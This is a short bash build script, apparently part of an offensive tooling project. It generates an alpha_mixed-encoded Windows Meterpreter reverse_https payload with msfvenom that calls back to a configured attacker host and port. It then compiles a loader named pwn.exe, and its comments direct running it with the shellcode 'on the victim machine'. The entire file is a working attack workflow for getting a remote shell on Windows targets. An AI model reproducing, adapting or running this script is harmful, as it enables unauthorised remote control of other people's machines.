#!/bin/bash          
# simple example script for building the .exe file

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# configure your connect-back settings here
LHOST=192.168.2.103
LPORT=443

# make meterpreter reverse payload, encoded with msf alpha_mixed 
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > alpha_mixed.txt

# compile to pwn.exe file
$win32_compiler -ffixed-eax -o pwn.exe ./source/alphamixedcmd.c

# now call with the output shellcode as parameter of pwn.exe on the victim machine: pwn.exe shellcode
# shellcode is in alpha_mixed.txt
